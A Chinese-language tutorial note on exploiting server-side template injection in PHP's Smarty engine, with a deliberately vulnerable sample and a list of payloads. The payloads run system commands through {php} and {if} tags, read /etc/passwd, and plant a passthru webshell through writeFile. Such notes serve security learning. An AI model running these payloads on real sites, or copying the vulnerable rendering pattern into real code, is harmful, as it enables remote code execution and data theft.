# Smarty

Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别

一般造成漏洞的原因是用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI，比如

```php
<?php
	require_once('./smarty/libs/' . 'Smarty.class.php');
	$smarty = new Smarty();
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	$smarty->display("string:".$ip);     // display函数把标签替换成对象的php变量；显示模板
}
```

其实，我们这种漏洞不管是啥引擎都是渲染的模版内容受到用户的控制

### 漏洞确认

一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号

### 常规利用方式

> Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。

Smarty支持使用`{php}{/php}`标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签

如果可以的话，不妨执行一些系统命令

```
{php}echo `id`;{/php}
```

### {literal} 标签

> **`{literal}`可以让一个模板区域的字符原样输出。** 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。

对于php5的环境我们就可以使用

```
<script language="php">phpinfo();</script>

// 从PHP7开始，这种写法<script language="php"></script>，已经不支持了
```

### {if}标签

```
Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &&, and, is_array(), 等等，如：{if is_array($array)}{/if}*
```

因此可以进行任意php代码执行

```
{if phpinfo()}{/if}
{if system('ls')}{/if}
```



### 静态方法(仅适合低版本，未测试具体版本号)

#### getStreamVariable

Smarty类的getStreamVariable方法的代码如下：

```
public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
```

利用payload：

```
{self::getStreamVariable("file:///etc/passwd")}
```

#### Smarty_Internal_Write_File

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

# 参考文献

[PHP的模板注入（Smarty模板）](https://blog.csdn.net/qq_45521281/article/details/107556915)

[us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)